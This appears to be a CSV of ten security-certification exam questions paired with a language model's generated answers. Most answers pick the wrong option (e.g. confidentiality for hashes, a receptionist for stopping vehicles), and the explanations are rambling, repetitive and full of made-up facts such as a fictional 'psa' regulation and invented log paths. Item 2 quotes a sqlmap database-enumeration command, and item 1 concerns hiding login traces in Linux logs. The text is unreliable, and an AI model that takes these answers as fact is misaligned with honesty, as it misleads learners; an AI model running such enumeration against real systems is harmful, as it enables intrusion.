index,question,llm_answer
1,"You have successfully logged on a Linux system. You want to now cover your trade Your login attempt may
be logged on several files located in /var/log. Which file does NOT belongs to the list:
A.  user.log
B.  auth.fesg
C.  wtmp
D.  btmp
","
the correct answer is b. most linux distributions will provide a login service. this is the file you log in to. if a user log in to the system, which file would be related to the login attempt? the five files listed here belong to the linux system log system. /var/log is just a convention and does not represent a logical path. user.log is not a file. the following are five files : /dev/log /home/log /mail/log /log.log which of the following would be a useful file? the process log ( /dev/log ) is a common design notation on linux for application logging. as applications are released, they may log to this file. the process log ( /home/log ) is a common idea among operating systems, and any logging system on linux will land in that file. mail.log ( /dev/log ) would be a useful log file because it provides a log path specific to mail. the mail.log file would be useful because it provides a log path specific to mail. the process log ( /home/log ) is probably useful because it would highlight processing operations on a linux system. it may include things like a message being sent, which would be displayed in case logic showed the file was not written to or closed to that message. the process log would also display a lot of information from the operating system, such as time, date, time of the log, and origin of the log. while the mail.log file would be useful, it may"
2,"What is the following command used for?
sqlmap.py-u
,,http://10.10.1.20/?p=1
&forumaction=search"" -dbs
A.  Creating backdoors using SQL injection
B.  A Enumerating the databases in the DBMS for the URL
C.  Retrieving SQL statements being executed on the database
D.  Searching database statements at the IP address given
","
the correct answer is b. the program a, in its entirety, is a tool that uses a range of sql injection methods to discover databases being used on the target. assuming the form is using ssh, the following command is used to connect : sqlmap.py-u,, & forumaction=search '' -dbs a. creating backdoors using sql injection using the previous connection command, you ’ ll see this line in the output : a brute-force method was used to guess databases. just what a surprise this is, but let ’ s wait to see the actual news has been found? there is a solution to this past-geek news : don ’ t describe yourself as a “ web designer ” and “ blog administrator. ” because you ’ ve been identified as a “ spy ” and “ spy computer. ” sufgeated as that may be, you ’ ve still had a good time discovering new methods to discover databases using sql map. a final note on how you might use sql map by using your local gobillioner attack team : don ’ t describe yourself as a “ web designer ” and “ blog administrator. ” because you ’ ve been identified as a “ spy ” and “ spy computer. ” sufgeated as that may be, you ’ ve still had a good time discovering new methods to discover databases using sql map. a final note on how you might use sql map by using your local gobillioner attack team : don ’ t describe yourself as"
3,"Sam, a web developer, was instructed to incorporate a hybrid encryption software program into a web
application to secure email messages. Sam used an encryption software, which is a free implementation of the
OpenPGP standard that uses both symmetric-key cryptography and asymmetric-key cryptography for
improved speed and secure key exchange. What is the encryption software employed by Sam for securing the
email messages?
A.  PGP
B.  S/MIME
C.  SMTP
D.  GPG
","
the correct answer is d. email encryption tools like soa.io, pgp.io, and pgp.harvest.com allow you to encrypt email messages you send within your organization using pgp or other secure mail encryption protocols. the underlying mechanism might be an smtp server, which is normally encrypted by default. this means that even if the mail server ( or the operator of the mailing list ) was to be compromised, it wouldn ’ t be of any use to attackers. how does this compare to using a synchronization protocol like snmp? snmp is a communication protocol used primarily within windows networks to provide for the synchronization of active directory data structures. what this means is that you could use for example, snmprecord.com to sync up with the active directory servers in your organization and then attempt to spoof any hostname or ip address. the idea here is that if the server synchronization doesn ’ t work exactly as expected, you could assume it ’ s compromised. snmp doesn ’ t provide a means to encrypt mail messages ; however, when it comes to smtp over tls, it makes the most sense. one last note on snmp and pgp is that if you are using a synchronization protocol to attempt to fool someone into thinking your address is legitimate, you could potentially use a fake ip address or a swap attack, where the attacker switches your address to look elsewhere. however much you know pgp is better than snmp when it comes to encrypting mail messages. pgp provides for a free"
4,"Which of the following is assured by the use of a hash?
A.  Authentication
B.  Confidentiality
C.  Availability
D.  Integrity
","
the correct answer is b. assumption, anecdotal evidence, and proof from a third-party source are all terms that come from information security. a hash is a value that generates another hash. unlike a key, which is unique and protects a single data structure, a hash protects against loss or corruption of that data. put differently, the hash of a book contains no relation to the book itself after it has been edited, manipulated, or corrupted. a hash is a great way to authenticate a message because every data structure is unique and can ’ t be replicated. for example, if you were to see the hexadecimal number 0x401 is a port number, you would know nothing about water pollution in america. after the hash is generated, it ’ s distributed everywhere and used for authentication. two different sources generating the same hash from the same data should cause suspicion on the part of the attacker. the last step in this process is to extract the information from the hash because it will be distributed everywhere already. extracting that information and sending it to someone should cause suspicion on their end. just remembering this step will help you throughout your life ; in fact, it ’ s a good start to remembering security in general. a hash is a wonderful authentication tool because it ’ s dependent on the data structure it ’ s analyzing ; it ’ s not its own master key. in other words, a hash is not a key. a key is a unique piece of data that locks a data structure together. a hash"
5,"What is not a PCI compliance recommendation?
A.  Use a firewall between the public network and the payment card data.
B.  Use encryption to protect all transmission of card holder data over any public network.
C.  Rotate employees handling credit card transactions on a yearly basis to different departments.
D.  Limit access to card holder data to as few individuals as possible.
","
the correct answer is d. while it is generally considered to be one aspect of rfid, credit card theft and fraud are much higher up the scale than roaming. it would be like trying to find the lowest price on apples or oranges and then asking how much you should be paying for apples and oranges. you simply can ’ t compare the two. having said that, card holder data (pchd ) is important to a smooth running business. recommendations for maintaining pchd are to keep it to within 0.35 to 0.50 percent of the total value of credit card sales each year, to make it convenient and efficient for the customer, while maintaining a level cash flow for the business. it should also be noted that pci compliance does not ensure that cards will not be stolen or that it will reduce fraud. instead, it is simply trying to protect any data associated with the card. one last note on pci compliance — unless you ’ re talking to a member of the microsoft security team, you ’ ll see some interesting details regarding your credit card data transmits to them. you might have reasons for using a public exchange card tracking system, but you ’ re exposing yourself to potential security breaches using it. a private one is better. next step is to apply security fixes to the encoding algorithms so that they don ’ t allow plain text transmission. in short, be careful about how you handle pchd. it could be your one last chance to avoid cashing out. a"
6,"What is the proper response for a NULL scan if the port is closed?
A.  SYN
B.  ACK
C.  FIN
D.  PSH
E.  RST
F.  No response
","
the correct answer is e. a null scan makes sense if you aren ’ t already aware of what null scanning is all about. a null scan sends messages to all ports, expecting only a null response. not only does the machine not respond, it doesn ’ t even sense the request in the first place. if the port is open, you ’ ll get a syn message back ; when the port is closed, you ’ ll get an ack message back. from there, things get a little confusing. the response to a syn request should be a syn/ack message. if the port is open, you ’ ll get a syn/ack/no response. huh. a syn/ack message may also be returned if the port is closed. only instead of a syn/ack, you ’ d get a rst message. finally, the correct response to a null scan is no response. it ’ s possible the port is closed or unreach-able, but it ’ s not the response to a syn scan. it should ’ s be noted that just because a port is closed doesn ’ t mean that a port should not be opened. some reasons why a port may be opened include insuring that a lesson passes easily or, oh, allowing connection requests from anywhere. a null scan just tries to see if the lesson will connect easily. it ’ s not intended to do any connection testing. if a lesson is closed, the syn scan may connect easily. a lot of people think a null"
7,"What kind of detection techniques is being used in antivirus software that identifies malware by collecting data
from multiple protected systems and instead of analyzing files locally it?s made on the provider?s
environment?
A.  Behavioral based
B.  Heuristics based
C.  Honeypot based
D.  Cloud based
","
the correct answer is b. antivirus solutions have been able to identify malware for decades now. though practice has evolved some, mostly in the way antivirus solutions have had to adapt to detecting viruses and later, called files, that may have been previously unknown or no longer available ( because of the attack ). the only reason this comes to our attention, in part, is because of the number of files that were found there compared with all the others. behavioral based antivirus is looking at the behavior of the executable to determine what they ’ re doing. this kind of analysis can identify things like the size of the program overrun on a executable, how many statement executions were done, how many times the program tried to write to disk, and so on. heuristics based antivirus is looking at the nature of the provider, what kind of hashing algorithms are used, how the provider has been known to push out malicious software, and so on. a honeypot is a tool that is set up in an effort to attract attack crews, hook up to a network, and pretend to be something it isn ’ t. the idea is that when the attacker does what they ’ re doing, they ’ ll leave behind enough information to identify themselves. the honeypot is therefore a type of attack that attracts the attacker, providing a target for their efforts. the cloud is an implementation of software as a service where the hardware and software are hosted in the cloud provider ’ s infrastructure. because of the number of files"
8,"Which type of security feature stops vehicles from crashing through the doors of a building?
A.  Bollards
B.  Receptionist
C.  Mantrap
D.  Turnstile
","
the correct answer is b. while receptionists are used everywhere—airport, by the way—as important as they are and are key employees, receptionists in a building don ’ t in and of themselves cause a vehicle to crash through the doors. they may be used to help prevent a vehicle crashing through the door, but it ’ s not the reason why the gate is swinging open. the reason why the gate is swinging open is to allow vehicles to flow in and out of the parking lot. just as an note outside the scope of this question, receptionists are employed in a variety of ways and are used in a variety of locations. some receptionists are employed to handle everything from checking IDs and allowing vehicle access to a parking lot to standing guard outside a building. it ’ s also not just the receptionist—it may be for some that the door switch itself is controlling the gate, but that ’ s not right either. a man trap is used to restrict entry to a room or building by a man alone. a turnstile, though, is used to allow vehicle flow but will allow only one direction—usually allowing people to flow in but not out. it ’ s fast and secure, holds the door while turning a key, and allows vehicles to flow in and out of a building. not only does the turnstile allow people to flow in and out of the building, but it will also allow cars into a parking lot as well. one last note on man traps and turnst"
9,"A large mobile telephony and data network operator has a data center that houses network elements. These are
essentially large computers running on Linux. The perimeter of the data center is secured with firewalls and
IPS systems.
What is the best security policy concerning this setup?
A.  Network elements must be hardened with user ids and strong passwords. Regular security tests and audits should be performed.
B.  As long as the physical access to the network elements is restricted, there is no need for additional measures.
C.  There is no need for specific security measures on the network elements as long as firewalls and IPSsystems exist.
D.  The operator knows that attacks and down time are inevitable and should have a backup site.
","
the correct answer is d. most questions on the exam will be based on factors like this, so do a lot of reading and learning about security on your exam. the physical access question is unrelated to this topic. as for the other two, sure, hardening external access to equipment and ensuring security before deploying the equipment is a good idea, and the physical protection of the equipment should help protect against unauthorized access. the question is whether there ‘s any use making the same secure equipment double or triple secured outside the organization. no sense at all there. just a horrible idea. the point is securing the inside of the network and security during deployment is much more important than securing the outside. scanning and enumeration should help in identifying available secure hospitals and networks before you decide which equipment to use. this step will avoid a lot of trouble a common sense approach to security could get into. finally, hardening all external accesses to the network should help there as well. for a final aside, remember that the idea of a successful attack or challenge is sometimes described as gaining or maintaining access to a targeted resource—or to use security as such. having no use for the target at all should help with that. in other words, whether it ’ s external access to a system, a route to networking subsistence food, or a a couple of seats at a particular game, security access from the outside should not change much. the less it changes, the better off you are. lastly, a question like this"
10,"Which regulation defines security and privacy controls for Federal information systems and organizations?
A.  HIPAA
B.  EU Safe Harbor
C.  PCI-DSS
D.  NIST-800-53
","
the correct answer is b. the europeans safe harbor regulation defines how to handle data security and privacy in the european union. the regulation is named psa ( privacy and security act ) and was developed after other standards protect more of our lives and businesses more of the time. the psa requires businesses to register with the e.gip and monitor and protect data held in or transferred between e.g. entities. the regulation is named psa by the great security watchdog, the european commission, and describes how to protect data within and transferred between enterprises. the regulation is named psa by the huyness of security watchdog, which doesn ’ t know what security and privacy actually mean. the only thing you know about security and privacy to this point is that they ’ re confusing you about information security and exposing your secrets. the psa regulation defines how to deal with information systems owned by a client, meaning that even if you were to give them free software, they would be liable for its security and protection. the regulation defines how to associate laws with laws, how to present information regarding legal aspects of a dispute to the clients, how to implement law and law-related procedures to respond to a dispute, and how to resolve the dispute as best possible. the psa regulation is named psa by the great security watchdog, but most people else call it the hipaa regulation. hipaa defines how to protect information in federal systems and organizations, and it was implemented in 2002 as a response to"
